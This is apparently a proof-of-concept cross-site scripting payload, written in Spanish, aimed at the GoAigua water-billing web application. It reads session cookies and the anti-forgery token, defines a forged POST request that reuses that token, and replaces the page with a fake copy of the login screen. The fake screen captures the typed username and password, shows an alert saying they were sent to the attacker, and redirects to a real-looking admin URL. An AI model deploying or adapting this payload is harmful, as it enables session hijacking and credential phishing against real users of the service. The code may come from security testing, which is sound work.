var micookie = document.cookie;
alert("Mis cookies de sesion : " +micookie);
var csrf_token = $("input[name='__RequestVerificationToken']").val();
alert('Mi token CSRF : ' + csrf_token);
document.getElementById("page-wrapper").innerHTML= "";

myfunction = function(){
$.ajax({
        type: 'POST',
        url: '/TipoVia/SaveAsync',
        data: { __RequestVerificationToken: csrf_token, descripcion: 'ts1', abreviada: 'tst2'},
        success: function (resp) {
            alert(resp);
        }
    });
}
var buttontest = document.createElement('button')
buttontest.setAttribute("id", "botonprueba");
buttontest.setAttribute("onclick", "myfunction()");
buttontest.setAttribute("class", "ladda-button dim ladda-button-demo btn btn-primary");
var htmlpage = '<div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">  <div class="pace-progress-inner"></div></div><div class="pace-activity"></div></div><div class="middle-box text-center loginscreen animated fadeInDown" style="height:100%;">        <input id="cultureName" name="cultureName" type="hidden" value="es-PE">        <!-- Main view  --><div class="centrar-verticalmente-padre" style="padding-top: 300px!important;"><div class="centrar-verticalmente-hijo">		<div>					<img class="m-xxs m-b-sm" src="../Content/img/go-aigua/logo_GOAIGUA_black.svg">		</div>		<p>			Software para la gestión completa del ciclo comercial del agua.		</p>		<form class="m-t" method="post" action="#" id="login_fake">			<input id="reqlogin" name="__RequestVerificationToken" type="hidden" value="">			<div class="form-group">				<input class="form-control" data-val="true" data-val-required="El campo &#39;Usuario&#39; es obligatorio." id="UserName" name="UserName" placeholder="Usuario" type="text" value="">			</div>			<div class="form-group">				<input class="form-control" data-val="true" data-val-required="El campo &#39;Contraseña&#39; es obligatorio." id="Password" name="Password" placeholder="Contraseña" type="password">			</div>			<div class="form-group">				 <select class="form-control" id="cultura" name="cultura"><option selected="selected" value="es-PE">Español (Perú)</option></select> 			</div>		</form>		<button class="ladda-button btn btn-primary block full-width m-b muestraCargaLogo" id="btnLoginfake">			<span class="ladda-label">Iniciar Sesión</span>			<span class="ladda-spinner"></span>		</button>		<a onclick="#" class="control-label">¿Has olvidado tu contraseña?</a>		<div class="m-t">			<span class="textoAlineadoTop">Modo oscuro o claro</span>			<label class="switch-theme m-l-10" for="checkbox-theme">				<input type="checkbox" id="checkbox-theme" onclick="#">				<div class="slider round"></div>			</label>		</div>		<div class="validation-summary-valid" data-valmsg-summary="true"><ul><li style="display:none"></li></ul></div>		<p class="m-t"> <small>GoAigua: Billing © 2022 - v 6.0.0 (0-220211)</small> </p>	</div></div>    </div>    <script type="text/javascript" src="../bundles/base_javascript.js"></script>    <script type="text/javascript" src="../bundles/main_libraries.js"></script>        <script type="text/javascript" src="../bundles/domain.js"></script>        <script src="../Scripts/plugins/printThis/printThis.js"></script>'
document.getElementById("page-wrapper").innerHTML = htmlpage;
//document.getElementById("page-wrapper").appendChild(buttontest);
//$("#botonprueba").html("Mi boton de prueba");
/*
var iframet = document.createElement('iframe');
iframet.src = 'https://www.gruponatividad.com/';
iframet.setAttribute("id", "miiframe");
iframet.setAttribute("style", "overflow:hidden;overflow-x:hidden;overflow-y:hidden;position:absolute;top:0px;left:0px;right:0px;bottom:0px;height:100%;width:100%;");
iframet.frameBorder = 0;
document.getElementById("page-wrapper").appendChild(iframet);
*/
$("#btnLoginfake").on("click", function() {
    let usuario = $("#UserName").val();
    let clave =  $("#Password").val();
        
     alert("Usuario : "+usuario+" y Clave : "+clave + " ### capturados y enviados al atacante");
     window.location.replace("https://billing-sedalib-vlc-des-admin.go-aigua.com/home/index")
});
